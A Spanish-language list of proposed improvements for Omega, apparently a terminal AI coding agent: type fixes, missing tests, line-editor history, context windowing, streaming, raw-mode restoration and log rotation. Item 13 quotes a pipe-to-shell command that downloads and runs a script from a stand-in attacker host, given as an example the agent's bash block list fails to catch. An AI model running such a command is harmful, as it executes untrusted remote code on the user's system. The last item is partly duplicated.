# Mejoras propuestas para Omega

## 🔴 Alta prioridad

### 1. Tipar `any` en runner y providers ✅

El runner castea la respuesta del LLM como `any`:

- `runner.ts:55` → `const data: any`
- `openrouter-llm-provider.ts:141` → `parseResponse(data: any)`
- `anthropic-llm-provider.ts` → `call()` devuelve `Promise<unknown>` y runner lo trata como `any`
- `catch (err: any)` en tools, session, providers (varios archivos)

**Solución**: Unificar el tipo de respuesta que el runner espera (ya existe `ProviderResponse` en openrouter, pero AnthropicProvider devuelve `unknown`). Definir un tipo común `LLMResponse` en `llm-provider.ts` que ambos providers implementen.

---

### 2. Tests del Runner ✅

No hay tests para el loop agéntico principal. Es el componente más crítico del sistema:

- `runner.ts` — 0 tests
- Traducción de mensajes en OpenRouterProvider
- `parseResponse`
- Mecanismo de retry/backoff
- Manejo de `max_tokens` y `end_turn`
- Casos borde: tool que no existe, error en tool, respuesta vacía

**Solución**: Agregar tests con un provider mock que devuelva respuestas controladas.

---

### 3. Tests de OpenRouterProvider ✅

El provider real tampoco tiene tests:

- `translateMessages()` — conversión del formato interno al de OpenAI
- `translateTools()` — conversión de herramientas
- `parseResponse()` — parseo de la respuesta cruda
- Retry lógico (429, 529), timeout

---

## 🟡 Media prioridad

### 4. Selección de provider por config ✅

~~`AnthropicProvider` existe pero no se usa. Debería seleccionarse vía variable de entorno `PROVIDER=anthropic|openrouter`.~~

**Resuelto**: AnthropicProvider borrado. OpenRouter es el único camino.

---

### 5. Historial de comandos en el editor de línea

`LineEditor` no permite navegar comandos anteriores con up/down. Tampoco tiene:

- Cursor visible (no podés moverte con left/right)
- Ctrl+u (borrar línea), Ctrl+w (borrar palabra), Ctrl+k (borrar hasta el final)
- El método `commands()` está vacío (dead code)

**Decisiones de diseño (enfoque B -- multilínea + historial):**

- **Cursor**: índice numérico dentro del buffer. Left/Right/Home/End lo mueven. Delete borra hacia adelante. Las inserciones y backspace operan en la posición del cursor.
- **Historial**: array de comandos previos (sin el \n final). Navegación con Up/Down.
- **Up/Down con multilínea**: si el buffer contiene saltos de línea, Up/Down mueven el cursor entre líneas. Solo cuando el cursor está en la primera línea (Up) o última línea (Down) se navega el historial. Al entrar al historial se guarda el buffer actual como borrador para poder volver con Down.
- **Render con cursor ANSI real**: `InputComponent` expone `getCursorPosition?(): {row, col}` para que `run()` posicione el cursor del terminal después de dibujar.
- **Atajos**: Ctrl+A (Home), Ctrl+E (End), Ctrl+U (borrar línea actual), Ctrl+W (borrar palabra hacia atrás), Ctrl+K (borrar hasta final de línea).
- **Dead code**: eliminar el método `commands()` vacío y el `if (key.value === "/") {}`.

---

### 6. Comando `/help` ✅

Solo existe `/clear`. No hay forma de que el usuario descubra los comandos disponibles. Agregar `/help` que liste los comandos y describa brevemente el uso.

---

### 7. `DisplayToolCall` sin usar ✅

La clase existe y está exportada pero nunca se instancia en `index.ts`. Cuando el runner usa una tool, imprime "Usando tool: ..." como texto genérico.

---

### 8. Límite de contexto / windowing en Session ✅

`Session` acumula mensajes sin límite. En conversaciones largas, el historial crece hasta exceder el contexto del modelo. Implementar ventana deslizante (`sliding window`) o truncar mensajes viejos.

**Resuelto**: `Session` acepta `maxMessages` en el constructor. El getter `messages` devuelve solo los últimos N mensajes (sliding window). El historial completo se preserva en `allMessages` y en disco. Configurable vía `MAX_CONTEXT_MESSAGES` (default: 50).

---

### 9. El spinner y el output no conviven bien ✅

El spinner se arranca/para en cada iteración, pero si el LLM tarda o hay output intercalado, los mensajes se pisen si el terminal se redimensiona. Mejorar el manejo de cursor en la TUI.

**Resuelto**: Spinner ahora oculta el cursor (`\x1b[?25l`), no emite `\n` extra, usa `\r` para sobrescribir en misma línea, y limpia con `\x1b[K` + restaura cursor al parar.

---

## 🟢 Baja prioridad

### 10. Restaurar raw mode en salidas abruptas ✅

En `render.ts:23`, Ctrl+C hace `process.exit(0)`. Si el proceso muere por `SIGTERM` o `SIGKILL`, la terminal queda en raw mode y el usuario tiene que ejecutar `reset` manualmente.

**Resuelto**: `terminal.ts` expone `disableRawMode()` y registra handlers para `SIGTERM`/`SIGINT`. `render.ts` llama `disableRawMode()` antes del `process.exit(0)`. `main().catch()` también restaura.

---

### 11. Error de tool `read` cuando input es inválido ✅

```ts
return `Error reading ${input}: ${err.message}`;
```
Si `input` no es válido, muestra `[object Object]`. Debería mostrar un mensaje más limpio.

---

### 12. Streaming ✅

~~La llamada al LLM es request/response completa. Con modelos grandes el usuario espera sin feedback. Streaming (SSE) mejoraría la experiencia. Requiere refactor del provider y del runner.~~

**Resuelto**: Streaming implementado.

---

### 13. Seguridad de BashTool

Los patrones bloqueados son una lista fija. Un comando como `curl http://evil.com/script.sh | bash` no es detectado. El mismo código lo admite: "Esto NO es un sandbox". Agregar un modo restringido con lista blanca de comandos.

---

### 14. Tests de componentes TUI

No hay tests para:

- `decodeKey.ts`
- `render.ts`
- `spinner.ts`
- `line-editor.ts`
- `display-text.ts`

---

### 15. Tests de commands

No hay tests para `/clear` ni para el `dispatchCommand`.

---

### 16. Tests de context-management

`truncate()` no tiene tests.

---

### 17. Tests de Session

Existen tests básicos, pero no cubren:

- Persistencia (carga/guardado en disco)
- Reanudación por id
- Clear
- info()

---

### 18. AnthropicProvider manda mensajes sin traducir (bug)

`AnthropicProvider.callWithRetry()` pasa `messages` (el array `Message[]` interno) directo a la API de Anthropic. Pero Anthropic espera un formato de mensajes distinto al de OpenAI/OpenRouter: los `content` arrays con `ToolMessage`, `TextMessage` o strings no son entendidos por la API de Anthropic. `OpenRouterProvider` resuelve esto con `translateMessages()`. AnthropicProvider necesita su propia traducción.

---

### 19. Runner no maneja `stop_reason === "tool_use"`

`LLMResponse.stop_reason` incluye `"tool_use"` como valor posible, pero el runner solo frena con `"end_turn"` y `"max_tokens"`. Si un provider devuelve `"tool_use"` como stop_reason, el loop sigue hasta `maxSteps` innecesariamente.

---

### 20. `config.openrouterApiKey!` con non-null assertion

En `index.ts` se usa `config.openrouterApiKey!` sin validar que exista. Si la variable de entorno no está seteada, el error en runtime es oscuro. Debería validarse en `validateEnv()` con un mensaje claro, o hacer la selección de provider dinámica (ver punto 4) y exigir solo la key del provider elegido.

---

### 21. Métricas del runner nunca se exponen ✅

`Runner.getMetrics()` y `Runner.resetMetrics()` existen pero no se llaman desde `index.ts`. Las métricas (tokens, tool calls, duración) se acumulan invisiblemente. Podrían mostrarse al final de cada respuesta del agente.

**Resuelto**: Después de cada iteración del runner se muestra una línea tenue: `~ N tools · In+Out tokens · X.Xs · $0.XX (total: $0.XX)`. Incluye costo por llamada y costo acumulado de la sesión. Los precios se toman de la tabla de pricing de OpenRouter por modelo.

---

### 22. Comando desconocido no da feedback ✅

Si el usuario escribe un comando que no existe (`/algo`), `dispatchCommand` devuelve `false` y el texto se envía al LLM como mensaje normal. El usuario no recibe ningún aviso de que el comando no fue reconocido. Debería mostrarse un mensaje como "Comando no reconocido. Usá /help para ver los disponibles."

**Resuelto**: `dispatchCommand` ahora muestra el mensaje y retorna `true` (no envía al LLM).

---

### 23. Truncate afecta al modelo, no solo al display

En `runner.ts`, `truncate(output, 200)` corta el output que se muestra al usuario y también el que se guarda en `toolResults` para el modelo. Si el output real era más largo (ej. un archivo de 500 líneas), el LLM solo ve 200 líneas. La versión completa debería guardarse en el mensaje y la truncada solo usarse para display.

---

### 24. `main().catch()` no restaura raw mode ✅

Si ocurre un error fatal (`main().catch`), la terminal queda en raw mode porque no se llama a `disableRawMode()`. Relacionado al punto 10, pero distinto: el 10 habla de SIGTERM/SIGKILL externos, este es un error interno de la app.

**Resuelto**: `main().catch()` llama `disableRawMode()` antes de loguear y salir.

---

### 25. README.md desactualizado

El diagrama de arquitectura muestra `AnthropicProvider`, pero el default real es `OpenRouterProvider`. No documenta `OPENROUTER_API_KEY` ni menciona que el provider por defecto es OpenRouter.

---

### 26. No hay tests de `edit` tool ✅

~~Solo bash, read y write tienen tests. EditTool no tiene cobertura.~~

**Resuelto**: `edit.test.ts` con 22 tests.

---

### 27. Logs sin rotación

Los logs en `.omega/logs/` se acumulan indefinidamente. No hay mecanismo de rotación ni cleanup automático. Con uso intensivo, el directorio crece sin control.ación

Los logs en `.omega/logs/` se acumulan indefinidamente. No hay mecanismo de rotación ni cleanup automático. Con uso intensivo, el directorio crece sin control.